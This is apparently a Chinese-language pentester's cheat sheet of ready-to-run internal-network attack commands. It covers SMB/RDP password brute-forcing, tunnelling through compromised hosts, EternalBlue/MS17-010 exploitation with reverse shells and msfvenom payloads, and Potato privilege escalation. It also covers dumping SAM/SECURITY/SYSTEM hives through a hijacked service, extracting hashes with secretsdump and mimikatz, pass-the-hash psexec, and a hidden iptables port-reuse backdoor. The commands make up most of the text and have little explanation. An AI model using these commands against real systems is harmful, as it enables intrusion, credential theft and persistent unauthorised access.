https://gitee.com/windyjxx/projects

## 信息收集
[ENScan_GO | 剑指HW/SRC，解决在HW/SRC场景下遇到的各种针对国内企业信息收集难题](https://github.com/wgpsec/ENScan_GO)

[隧道？代理？端口转发？（一文读懂）](https://mp.weixin.qq.com/s/PDIWU-xej9SffRXlDEJYdA)
[常用的端口转发方式](https://mp.weixin.qq.com/s/VjFb77ALUKSzenKQYI42jA)


### fscan

```bash
fscan -h 10.63.81.21 -p 1-65535 -np
fscan -h 10.63.81.21 -p 1-65535 -np -nobr
# -m 参数见 plugins目录
## 密码爆破 smb smb2 rdp 都可以
fscan -h 192.168.127.137 -m smb -user administrator -pwdf pwd.txt
fscan -h 192.168.127.137 -m rdp -user administrator -pwdf pwd.txt
```

### kscan
kscan.exe -t 10.0.0.0/8 --hydra --hydra-pass file:pwd.txt

### crackmapexec

```bash
crackmapexec smb <ip>/24 -u <useranme> -p <password>
crackmapexec smb 172.22.3.0/24 -u a -p a
```

## C2工具类似msf
empire && starkiller VS metasploit && armitage

empire && starkiller的体验还不错

* Havoc
* Sliver
* BRC4

## 内网相关/内网穿透
[干货|通过边界代理一路打到三层内网+后渗透通用手法](https://mp.weixin.qq.com/s/uDPCkbWcp-upMH3r2x1WMA)
[不同中间件端口复用代理解决方案](https://9bie.org/index.php/archives/969/)
[Neo-reGeorg -- php](https://blog.csdn.net/qq_42094992/article/details/115143527)
[分享几款免费实用的国产内网穿透工具](https://mp.weixin.qq.com/s/QVH3e18fE_jF_0y3rd5pLw)

frp/nps


-- for xp/2003
3proxy 7.x / CCProxy
nc
[lcx](https://github.com/UndefinedIdentifier/LCX)

[内网渗透中隧道渗透技术](https://blog.csdn.net/qq_17204441/article/details/88834324)
[内网渗透之主机出网OR不出网隧道搭建](https://www.freebuf.com/articles/web/255801.html)


边界代理
* 代理类别：HTTP代理、socks代理、telnet代理、ssl代理
* 代理工具：EarthWorm、reGeorg(http代理)、proxifier(win)、sockscap64(win)、proxychains(linux)

### tcptunnel 端口转发
[tcptunnel 利用 TCP 隧道让内网不出网主机上线 MSF](https://mp.weixin.qq.com/s/iDAAC3BRPj2YaWkNZPWEDQ)

> 192.168.0.120 为边缘机器
```bash
# x64
192.168.142.110$ tcptunnel --local-port=1080 --remote-port=4444 --remote-host=192.168.0.120 --fork --buffer-size=8192 --stay-alive
# x86
192.168.142.110$ tcptunnel --local-port=1080 --remote-port=4444 --remote-host=192.168.0.120 --buffer-size=8192 --stay-alive

## msf
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.142.110 lport=1080 -f exe -o shell.exe
```
### lcx
nb -tran 8000 192.168.127.134:8000
nb -tran 1235 192.168.127.134:1235

```bash
# 正向转发 lcx.exe -tran LocalPort RemoteHost RemotePOrt 
lcx.exe -tran 1234 192.168.10.10 3389

# 反向转发
# 示例1 kali机以Win7为跳板机登录Win10
## Win7上执行: 将9000 转发到 9001
## lcx.exe -listen SourcePort  TargetPort
lcx.exe -listen 9000 9001

## 将win10 3389 转发到 Win7: 9000 端口，在Win10上执行：
## lcx.exe -slave RemoteHost RemotePort LocalHost LocalPort
lcx.exe -slave 192.168.10.10 9000 127.0.0.1 3389

## kali连接9001：
rdesktop 192.168.10.10:9001
```
### nc
[nc端口转发](https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/)
```bash
# 跳板机: 8888 转到 153 的 22端口上
nc -l -p 8888 -c "nc 192.168.19.153 22"
```

自动循环连接
```bash
while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
```
## MS17-010: AutoBlue-MS17-010
[​MS17010打法](https://mp.weixin.qq.com/s/UM7frymXiyTEvrJC3wNMYw) [L1](https://www.youtube.com/watch?v=p9OnxS1oDc0) [L2](https://www.youtube.com/watch?v=_uLJB_Ys120&t=688s)
[py/Cobalt Strike DLL](https://www.cnblogs.com/Thorndike/p/15242477.html)

常用 
```sh
Ladon.exe 192.168.50.153 MS17010
fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
# "1qaz@WSX!@#4"
# 3. https://www.freebuf.com/vuls/356052.html
Eternalblue
```


### python AutoBlue 使用

```shell
# 1. config
./shell_prep.sh

# 2. create shell 普通反弹shell, 成功率较高
LHOST for reverse connection:
192.168.183.231
LPORT you want x64 to listen on:
1234
LPORT you want x86 to listen on:
1234
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1

## 3. Listen 攻击机
nc -lvvp 1234

## 4. expoloit 新终端 执行, 稍等2秒, 没效果再执行, 直到反弹成功
python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64.bin
### 如果是meterpreter, 要用sc_x64_msf.bin, 比上面容易蓝屏 成功率不高
python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64_msf.bin
```

```shell
# server2003_win xp 
python2 checker.py ip 
python2 zzz_exploit.py ip 

# server2008_win7 
x86 推荐使用 
python2 eternalblue_exploit7.py ip shellcode/msfexecx86.bin 
# x64 推荐使用 
python2 eternalblue_exploit7.py ip shellcode/sc_all.bin

# server2012_win8.1+ 
python2 eternalblue_exploit8.py ip shellcode/sc_all.bin
```


### Eternalblue
```
Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 10.10.20.7 --TargetPort 445
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1125 -f dll -o bind.dll
Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 192.168.52.143 --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload bind.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60
```

zzz_exploit.py
```
# Pipe
netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER db2remotecmd ```netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER db2remotecmd
python zzz_exploit.py <ip> <pipe>
```
### Ladon/proxifier
proxifier不支持ICMP或者说ew等代理工具也不支持ICMP协议，所以代理后探测存活主机就不要使用Ping或OnlinePC模块了，使用扫描模块需加noping参数，非扫描模块不需要noping。探测存活主机可使用osscan、webscan、urlscan、ms17010、smbghost等模块，

[Usage](https://github.com/k8gege/Ladon/wiki/Ladon-Usage)

检测
```shell
Ladon 192.168.1.8 MS17010
Ladon 192.168.1.8/24 MS17010
Ladon 192.168.1.8/c MS17010
Ladon 192.168.1.50-192.168.1.200 ICMP
Ladon ip24.txt ICMP
Ladon 192.168.1.8 WhatCMS # 扫描IP
Ladon noping 192.168.1.8 WhatCMS # 扫描IP 禁PING扫描
Ladon 172.20.10.1/24 WebScan
Ladon noping 10.x.x.x PortScan
Ladon noping 10.x.x.x PortScan 21,22,80
```

正向代理Socks5
```shell
Ladon Socks5 192.168.1.8 1080
```

使用 proxifier 代理扫描, 代理工具不支持ICMP，必须加noping

```sh
Ladon noping 10.1.2.8/24 MS17010
```

[密码爆破](http://k8gege.org/Ladon/sshscan.html)

```shell
# 扫描C段445端口Windows机器弱口令
Ladon 192.168.1.8/24 SmbScan
Ladon 192.168.1.8/24 SshScan
Ladon 192.168.1.8/24 FtpScan
Ladon 192.168.1.8/24 MysqlScan
# 扫描C段1521端口Oracle服务器弱口令
Ladon 192.168.1.8/24 OracleScan

# 扫描C段27017端口MongoDB服务器弱口令
Ladon 192.168.1.8/24 MongodbScan

# 扫描C段1521端口Oracle服务器弱口令
Ladon 192.168.1.8/24 SqlplusScan

# 扫描C段5985端口Winrm服务器弱口令
Ladon 192.168.1.8/24 WinrmScan
Ladon 192.168.1.8/24 RedisScan

# 扫描C段8728端口RouterOS路由器
Ladon 192.168.1.8/24 RouterOSScan
```
5、远程命令执行
```shell
Ladon SshCmd host port user pass cmd
Ladon WinrmCmd host port user pass cmd
Ladon PhpShell url pass cmd
Ladon PhpStudyDoor url cmd
```

Potato 提权
```shell
Ladon SweetPotato whoami # win7,2012r2
Ladon SweetPotato shell.exe
Ladon badpotato # win8
```

[反弹shell](http://k8gege.org/Ladon/ReverseShell.html)
```shell
# 反弹 NC shell
Ladon ReverseTcp 192.168.1.8 4444 nc
# 反弹MSF TCP Shell
Ladon ReverseTcp 192.168.1.8 4444 shell
# 反弹MSF TCP Meter
Ladon ReverseTcp 192.168.1.8 4444 meter
```

#### Ladon 10
* 0x001 GodPotato提权

支持: Win8-Win11/Win2012-2022服务提权至SYSTEM

```sh
Ladon GodPotato whoami
```

* 0x002 hikvision

```
0x002 hikvision 海康威视 CVE-2017-7921漏洞检测

Ladon 192.168.1.8/24 HikvisionPoc
Ladon http://192.168.1.8:8080 HikvisionPoc
Ladon url.txt HikvisionPoc

0x003 hikvision 海康威视 密码审计

Ladon 192.168.1.8/24 HikvisionScan
Ladon http://192.168.1.8:8080 HikvisionScan
Ladon url.txt HikvisionScan


0x004 hikvision 海康威视 配置文件解密

存在CVE-2017-7921漏洞，可下载配置文件，使用以下命令解密

Ladon HikvisionDecode configurationFile
```
* 0x005 RunSystem提权
```sh
Ladon RunSystem cmd.exe
Ladon RunUser cmd.exe
Ladon RunSystem c:\1.exe
```

0x006 RunToken复制令牌

复制指定进程令牌执行任意程序，system权限下，某些工具无法直接使用，如Chrome密码读取，未做降权处理的工具将无法读取，使用Runtoken模块可复制对应进程令牌执行，如explorer进程，切换后除了可以读取密码外，还能让VNC等或未做降权的C2程序可查看目标远程桌面，实际使用将cmd.exe替换成全路径的自定义exe即可，若是存在多个参数可以使用bat文件来执行。

```sh
Ladon RunToken explorer cmd.exe
Ladon RunToken explorer c:\1.bat
```

* 0x008  彻底关闭SMB、禁用445 阻止0day、横向移动、中继攻击等
```sh
Ladon Load CloseSMB
```
* 0x009  Safe008一键安全加固工具

* 0x009  禁用指定服务 
```sh
Ladon DisService Spooler
Ladon DisableService Spooler
```

* 0x010  停止指定服务
```sh
Ladon StopService Spooler
```

* 0x011 放行端口、阻止端口
```sh
Ladon OpenTCP  445
Ladon OpenUDP  161
Ladon CloseTCP  445
Ladon CloseUDP  161
```
* 0x012  PowerShell用法
```sh
powershell -exec bypass Import-Module .\Ladon.ps1;Ladon whoami
```
powershell版使用同样非常简单，只需最后的“Ladon whoami”命令，替换成你想要执行的命令即可，




# proxy代理
[ICMP/TCP隧道 | 内网代理和穿透工具的分析记录](https://mp.weixin.qq.com/s/jpmi7CfvcOmL4qkSBKLvKQ)
[Linux 或 Windows 上实现端口映射](https://mp.weixin.qq.com/s/V9iw_Z0B-dTJikvnwLUEAQ)

多层代理攻击方式
1. proxychains
2. msf route flush;set Proxies socks5:127.0.0.1:8989
3. frp 映射代理到攻击，再按1，2操作。
## proxychains

只对tcp流量有效，所以udp和icmp都是不能代理转发的。 有ping之类的扫描工具要关掉

proxychains4 -q -f proxychains.conf python3 ldapshell.py xiaorang.lab/Aldrich:111qqq...@172.22.8.15

## frp
[神兵利器 | Frp搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)
[隧道？代理？端口转发？（一文读懂）](https://mp.weixin.qq.com/s/PDIWU-xej9SffRXlDEJYdA)

https://www.jianshu.com/p/42861aa3fea2


* 常规方式

1. 攻击机 kali: 192.168.50.80 启监听 `./frps` 或配置
```conf
[common]
bind_addr = 0.0.0.0
bind_port = 7000
```

2. 拿到靶机后 Debian启动  `frpc -c frpc.ini` ，配置文件如下：
```conf
[common]
server_addr = 192.168.53.132  
server_port = 7000          
[socks5]
type = tcp
remote_port = 8989
plugin = socks5
```
3.可使用代理 192.168.50.80:8989

* 其他使用 frpc
```shell
frpc tcp -s 192.168.50.161:7000 -l 1234 -r 8080
# 相当于
[common]
server_addr = 127.0.0.1
server_port = 7000

[tcp1]
type = tcp
local_ip = 127.0.0.1
local_port = 1234
remote_port = 8000 # 本地1234启动http-server 远程访问 192.168.50.161:8080
```
### 命令行方式
不能做复杂配置

```bash
# frps.ini
[common]
server_addr = 127.0.0.1
server_port = 7000
token = frp123

# frpc
.\frpc tcp  -s "127.0.0.1:7000" -t frp123 -i "127.0.0.1" -l "2125"
```

## goproxy

```shell
proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon

# 二级代理HTTP: 使用本地端口8090，假设上级HTTP代理是22.22.22.22:8080
proxy http -t tcp -p "0.0.0.0:8090" -T tcp -P "22.22.22.22:8080"

# 一级TCP: 本地33080端口就是访问192.168.22.33的22端口。
proxy tcp -p ":33080" -T tcp -P "192.168.22.33:22"
# 二级TCP: 本地23080端口就是访问22.22.22.33的8080端口。
## VPS(IP:22.22.22.33)执行:
proxy tcp -p ":33080" -T tcp -P "127.0.0.1:8080"
## 本地执行:
proxy tcp -p ":23080" -T tcp -P "22.22.22.33:33080"

```
## ssh

* [『杂项』使用 SSH 实现三层网络穿透](https://mp.weixin.qq.com/s/RPM5UZcs4EwO0S7K7zaFBw)

![640 _1_.png](https://s2.loli.net/2023/04/10/cwQmkx8PrqvgT9b.png)

* 本地转发: 将 Ubuntu:22 转到 kali:222
```sh
#  Kali 上执行
ssh -CfNg -L 222:10.10.10.2:22 root@172.20.10.4
ssh root@127.0.0.1 -p 222
```

* 远程转发: 在远程主机上监听一个端口，所有远程主机指定的数据都会通过SSH隧道传输到本地主机的对应端口，远程转发相当于反向代理。
* 将 Kali:222 转发到 Ubuntu:22
```bash
Linux$ ssh -CfNg -R 222:10.10.10.2:22 root@172.20.10.5
 Kali$ ssh root@127.0.0.1 -p 222
```

* 动态转发: 代理
```bash
# 本机监听端口
kali$ ssh -CfNg -D 6666 root@172.20.10.4
## sudo vim /etc/proxychains.conf 添加 socks5 127.0.0.1：6666

# 远程主机监听端口 代理为 1.1.1.1:9050
kali$ ssh tunneluser@1.1.1.1 -R 9050 -N
```

* 示例: 三层网络穿透
```bash
Linux$ ssh -CfNg -R 222:10.10.10.2:22 root@172.20.10.5
 Kali$ ssh -CfNg -D 0.0.0.0:2222 root@127.0.0.1 -p 222
 Kali$ sudo vim /etc/proxychains.conf # 添加 socks5 127.0.0.2222
 Kali$ proxychains msfconsole
```

---


![](https://s2.loli.net/2022/12/31/vdz5bXjOt368sHW.png)

```sh
ssh -L localport:remotehost:remotehostport sshserver
```

| Label          | Desc                                                      |
| -------------- | --------------------------------------------------------- |
| localport      | 本机开启的端口号                                          |
| remotehost     | 连接机器的IP地址                                          |
| remotehostport | 转发机器的端口号                                          |
| sshserver      | 转发机器的IP地址                                          |
| Options        |                                                           |
| -L             | 表示Local Port Forwarding，即本地端口转发                 |
| -f             | 后台启用                                                  |
| -N             | 不打开远程shell，处于等待状态(不加-N则会进入分配的命令行) |
| -g             | 启用网关功能                                              |


![](https://s2.loli.net/2022/12/31/OVPkim34YNj5Wwy.png)

1.SSH远程端口转发
```shell
# 示例1
PC1$ useradd tunneluser -m -d /home/tunneluser -s /bin/true
PC1$ passwd tunneluser
PC1$ ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N # 跳板机1.1.1.1 将3389 转发到 内网 3.3.3.3:3389
## 攻击者
attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd


# 示例2 将A:6666 转发为 B->C:80
# B:192.168.0.106 C:10.10.10.154
ssh -fN -L 本地端口:目标IP:目标端口   root@192.168.0.106
ssh -fN -L 6666:10.10.10.154:80 root@192.168.0.106
# 解析:A在本地访问自己的6666端口，就相当于通过B访问C的80端口
# 即通过B将C的80端口转发到本地6666端口
```

![](https://s2.loli.net/2022/12/31/IAcaVtw671PUevX.jpg)

2.SSH本地端口转发

适用不出网机器, 允许我们从通常无法连接回我们的主机运行反向shell

从attacker-pc转发80并从PC-1使其可用
```shell
# 格式: ssh -N -L *:local_port:127.0.0.1:server_port tunne1user@1.1.1.1 
# pc-1:2.2.2.2, 将pc-1:80 转发到 1.1.1.1,  访问 pc-1:80相当于访问 1.1.1.1:80
PC-1$ ssh tunne1user@1.1.1.1 -L *:80:127.0.0.1:80 -N
PC-1$ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

示例2 开启代理, 通过代理的所有命令从192.168.50.161执行
```shell
# 示例 2, -p 指服务器 ssh的端口, 通过
ssh -f -N -D 127.0.0.1:1080 ubuntu@192.168.50.161 -p 2222
```


| Args | Desc                             |
| ---- | -------------------------------- |
| -f   | 后台运行                         |
| -N   | 不执行远程命令，只进行端口转发   |
| -D   | SOCKS 代理的端口                 |

## socat 端口转发

有时不行换frp
```shell
# 本地 1234 转发到 远程 4321
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
# 本地 80 转发到远程 80
socat -d -d -lh -v TCP4-LISTEN:80,fork TCP4:192.168.1.215:80
# 本地 822 转发到 本地 8080
socat TCP4-LISTEN:822,fork TCP4::8080
```

[SSH+socat](https://blog.51cto.com/u_14028678/3847755)
```shell
# ssh 监听本地1080 有数据时 转移到 SSH 连接上面，随后发往远程主机。
# 本地的 445端口数据通过sock代理转发到10.10.10.129的445端口上。
PC-1$ ssh -D 1080 user@192.168.175.146
PC-1$ socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445
# socat->sock默认端口就是 1080 ，使用其他端口要在最后指定 socksport=<port>
# 将 PC-1:445的数据, 通过 192.168.175.146 转发到 192.168.232.132:445
```

![](https://s2.51cto.com/images/blog/202109/10/944febf3e0d057a36652ad7fba9f3e09.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=/format,webp/resize,m_fixed,w_1184)

该选项允许 socat为收到的每个连接分叉一个新进程，从而可以在不关闭的情况下处理多个连接。如果不包括它，socat 将在第一个连接完成后关闭。 fork
回到我们的示例，如果我们想使用 PC-1 作为透视访问服务器上的端口 3389，就像我们对 SSH 远程端口转发所做的那样，我们可以使用以下命令

```shell
# 将 3.3.3.3:3389 挂载到 localhost:3389
PC-1$ socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```
请注意，socat 不能像SSH那样将连接直接转发到攻击者的计算机，但会在PC-1上打开一个端口，然后攻击者的计算机可以连接到该端口:

![](https://s2.loli.net/2023/01/01/1m9HgVTQbzJRjYW.png)

```shell
# 开防火墙 3389 端口
PC-1$ netsh advfirewall firewall localport=3389 add rule name="Open Port 3389" dir=in action=allow protacol=TCP
# 将 1.1.1.1:80服务 挂载到 localhost:80
PC-1$ socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

## gost 端口转发 -- 很全面
[Link](https://blog.csdn.net/zzlufida/article/details/82972053) 
[doc v2](https://v2.gost.run/configuration/)
[doc v3](https://latest.gost.run/)


__创建代理__
```bash
gost -L :8080 # http+socks5
gost -L user:pass@:8080 # http+socks5 带验证
```

__端口转发:__
将 1.1.1.1:9000 转发到 2.2.2.2:8080
PC1: 1.1.1.1
PC2: 2.2.2.2

```shell
# 创建代理
PC-1$ gost -L socks5://:2080
# 访问 1.1.1.1:9000 显示 2.2.2.2:8080
PC-2$ gost -L=rtcp://:9000/:8080 -F=socks5://1.1.1.1:2080
PC-2$ gost -L=rtcp://:9000/127.0.0.1:8080 -F=socks5://1.1.1.1:2080
# 转发多个端口
PC-2$ gost -L=rtcp://:9001/:8081 -L=rtcp://:9000/:8080 -F=socks5://192.168.50.232:2080


# 本地端口转发, 可转成走代理的端口
gost -L=tcp://:1234/192.168.50.80:8000 # 1234端口转发到 192.168.50.80:8000
gost -L=tcp://:2222/192.168.1.1:22 [-F=...]
## 一对多转发, 在每次收到转发请求后，会利用转发器中的节点选择器在目标地址列表中选择一个节点作为本次转发的目标地址。
gost -L tcp://:8080/192.168.1.1:80,192.168.1.2:80,192.168.1.3:8080?strategy=round&maxFails=1&failTimeout=30s

# 远程端口转发, 将172.24.10.1:2222上的数据(通过代理链)转发到192.168.1.1:22上,当代理链末端(最后一个-F参数)为SSH转发通道类型时，gost会直接使用SSH的远程端口转发功能:
gost -L=rtcp://:2222/192.168.1.1:22 [-F=... -F=socks5://172.24.10.1:1080]
## 例1 将 1.1.1.1:2126 显示 本地的80
gost -L :2125 # VPS服务端启动代理
gost -L=rtcp://:2126/:80 -F=socks5://1.1.1.1:2125

gost -L=forward+ssh://:2222 # 服务端:
gost -L=rtcp://:2222/192.168.1.1:22 -F forward+ssh://server_ip:2222


# 代理链
gost -L=:8080 -F=quic://192.168.1.1:6121 -F=socks5+wss://192.168.1.2:1080 -F=http2://192.168.1.3:443 ... -F=a.b.c.d:NNNN
```

代理模式
```shell
# 默认是 http+socks5
gost -L=:8080
# 将 socks4 转成 http/socks5
gost -L=:8080 -F=socks4://192.168.50.161:43848
```
## nginx端口转发 

https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/dai-xie#nginx


## tocks
apt-get install tsocks  
vi /etc/tsocks.conf  

```shell
local = 192.168.1.0/255.255.255.0  #local表示本地的网络，也就是不使用socks代理的网络  
local = 127.0.0.0/255.0.0.0  
server = 127.0.0.1   #socks服务器的IP  
server_type = 5  #socks服务版本  
server_port = 8888  # socks服务使用的端口  
```

run
```shell
tsocks curl http://myexternalip.com &
```

## pystinger 仅web服务权限不出网使用
[Link](https://cloud.tencent.com/developer/article/2036092) 

假设不出网服务器域名为 http://example.com:8080 ,服务器内网IP地址为192.168.3.11

SOCK4代理
```
1. proxy.jsp上传到目标服务器,确保 http://example.com:8080/proxy.jsp 可以访问,页面返回 UTF-8
2. 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行start D:/XXX/stinger_server.exe启动服务端
       不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
3. vps执行./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
此时已经在vps127.0.0.1:60000启动了一个example.com所在内网的socks4a代理
此时已经将目标服务器的127.0.0.1:60020映射到vps的127.0.0.1:60020

...

```

## regeorg
pip install安装

上传php到服务器
```sh
python reGeorgSocksProxy.py -u 靶机reGeorg脚本地址 -p 本地监听端口

vi /etc/proxychains.conf
# 添加
socks5 127.0.0.1 本地监听端口
:wq

proxychains 命令
```
## Neo-reGeorg
Public

```bash
python neoreg.py generate -k <your_password>
python3 neoreg.py -k password -u http://xx/tunnel.php

```


## SoftEther VPN内网穿透
[SoftEther VPN内网穿透](https://mp.weixin.qq.com/s/Xim1SKnU41Z_rb9aI0QdDA)

## 端口复用

iptable
```sh
# 新建端口复用链
iptables -t nat -N LETMEIN
# 端口复用规则
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
# 开启端口复用开关
iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
# 关闭端口复用开关
iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
# 开启端口复用
iptables -t nat -A PREROUTING -p tcp --dport 8000 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
```

(2) 使用socat连接
使用socat发送约定口令至目标主机打开端口复用开关

echo threathuntercoming | socat ‐ tcp:192.168.245.135:8000
使用完毕后，发送约定关闭口令至目标主机目标端口关闭端口复用

echo threathunterleaving | socat ‐ tcp:192.168.245.135:8000

## 其他隧道

ICMP隧道
* icmpsh
* pingtunnnel

DNS隧道
* dns2tcp
* dnscat2
* iodine

* [内网代理工具rakshasa](https://github.com/Mob2003/rakshasa)

# 远程桌面
## xfreerdp
```bash
xfreerdp /proxy:socks5://47.92.64.139:1234 /v:172.22.4.45 /u:'WIN19\Adrian' /p:babygirl1
xfreerdp /u:CONTOSO\JohnDoe /p:Pwd123! /v:1.2.3.4
xfreerdp /drive:kali,home/kali/vmware /v:127.0.0.1 /u:MyUser /p:MyPasswd
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd
xfreerdp /v:${your ip} /u:${your user name} /f /monitors:1 +fonts +window-drag +clipboard
xfreerdp /proxy:socks5://127.0.0.1:1080 /drive:kali,home/kali/vmware /v:127.0.0.1 /u:MyUser /p:MyPasswd
/proxy:[<proto>://][<user>:<password>@]<host>:<port>
```

## remmina
basic里可以设置共享文件夹

socks5代理
```shell
vi ~/.local/share/remmina/xxx.remmina
proxy_hostname=192.168.50.161
proxy_type=socks5
proxy_port=2080
# http代理
http_proxy=http://username:password@proxyserver.net:port/
http_proxy=http://192.168.50.161:2080/
```
## rustdesk 多平台/支持内网点对点
[Link](https://github.com/rustdesk/rustdesk/releases)

允许IP: ID右侧三个点 -> 允许IP直连


# other
[防封ip解决方案之ip代理池](https://mp.weixin.qq.com/s/jteH4KuRoSW6ozIwNm9NPg)

## linpeas

```sh
./linpeas.sh | tee linlog.txt
```

## keystore,keytool,ssl证书解密pcap

```shell
keytool -list -keystore c:\keystore # 输入密钥库口令tomcat
# 从密钥库导出.p12证书，将keystore拷贝到keytool目录，导出名为：tomcatkeystore.p12的证书，命令：
keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat

# 将.p12证书导入Wireshark
# 在Wireshark中打开 .pcap, 菜单: 编辑–首选项–Protocols–SSL，点击右边的Edit：输入：192.168.110.140 8443 http 点击选择证书文件 输入密码tomcat
```

## 向日葵_识别码和验证码提取工具

https://github.com/wafinfo/Sunflower_get_Password

## Sql Tools
Multiple.Database.Utilization.Tools
激活  Ole automation procedures 点击激活，日志提示激活成功之后即可使用。

# Domain/域
## psexec
```bat
psexec \\ip -u administrator -p admin cmd  进⼊半交互式shell
psexec -accepteula \\192.168.108.101 -s cmd.exe 建立交互的shell
psexec \\ip - uadministrator -p admin -w c:\cmd 进⼊交互式shell，且c:\是⽬标机器的⼯作⽬录
psexec \\ip -u administrator -p admin whoami all 执行命令
psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行文件
psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执行文件
```
## impacket/psexec.py

```sh
pip install impacket
# 注意前缀本例是域名 god/
# 1.命令行
python psexec.py god/administrator:hongrisec@2019@192.168.52.143
python smbexec.py god/administrator:hongrisec@2019@192.168.52.143 
## hash 认证
python psexec.py -hashes :8a963371a63944419ec1adf687bb1be5 god/administrator@192.168.52.143
# 1.1 msf msf_psexec.rc
# 2.执行命令
python psexec.py god/administrator:hongrisec@2019@192.168.52.143 ipconfig
# 3.上传文件并执行
python psexec.py god/administrator:hongrisec@2019@192.168.52.143 -c 1.bat 

# 修改密码
proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 111qqq...
# 登录测试
proxychains4 -q -f proxychains.conf python3 ldapshell.py xiaorang.lab/Aldrich:111qqq...@172.22.8.15

# 注册表文件 sam security system 导出hash, 见 delegation
msfvenom -p windows/x64/exec cmd="C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\sam.bat" --platform windows -f exe-service > delegation.exe
## sam.bat
reg save HKLM\SYSTEM C:\Users\Adrian\Desktop\system
reg save HKLM\SAM C:\Users\Adrian\Desktop\sam
reg save HKLM\SECURITY C:\Users\Adrian\Desktop\security
## run this
reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Adrian\Desktop\delegation.exe" /f
sc start gupdate
## get hash
/home/kali/.local/bin/secretsdump.py LOCAL -sam /tmp/sam -security /tmp/security -system /tmp/system
```

## mstsc
```bat
:: 1个服务器只能保留一个凭据
cmdkey /generic:"TERMSRV/192.168.50.153" /user:"admin" /pass:"123456"
mstsc /admin /v:192.168.50.153:33089
```

## mimikatz
[64种运行mimikatz的方法(含Bypass）](https://mp.weixin.qq.com/s/942pnjjTXvscIe6VErsKFw)

```bash
# multirdp
mimikatz.exe privilege::Debug ts::multirdp exit

# 通过注册表导出的 HKLM\Security,sam,system, 3个文件来导出hash
mimikatz.exe "lsadump::sam /system:system /sam:sam" exit
```

## bloodhound/sharphound/neo4j

* neo4j
* [download](https://neo4j.com/download-center/#community)

```bash
neo4j.bat console
# 检查是否能登录
URL：neo4j://localhost:7687
用户名(默认)：neo4j
密码(默认)：neo4j
```

[SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) 采集, 

```bash
# 方式1
SharpHound.exe -c all # BloodHound\resources\app\Collectors\SharpHound.exe
# 方式2
powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"
```
zip 压缩包的格式保存，拷贝到 BloodHound 主机上，右侧图标 Upload Data

文档
* [渗透测试之内网攻防篇：使用 BloodHound 分析大型域内环境](https://www.freebuf.com/articles/web/288370.html)
### neo4j安装 / bloodhound使用

```sh
cmd /c start http://localhost:7474/
# neo4j/neo4j
# 改为 neo4j/12345678
bloodhound --nosandbox
```

- 拖拽 20230620232158_BloodHound.zip 到中间导入。
- 左上Analysis - 随便点击
- 路径由粗到细的那边，就是xx对xx具有的权限或者说关系，所以路径如下

### neo4 FAQ

- neo4j.bat 找不到或无法加载主类 org.neo4j.server.startup.Neo4jCommand
- neo4jHOME有问题，可以删除掉 或者设置为 当前路径

# 团队协作 
rocketchat 局域网聊天工具。web 可传文件
synolog chat
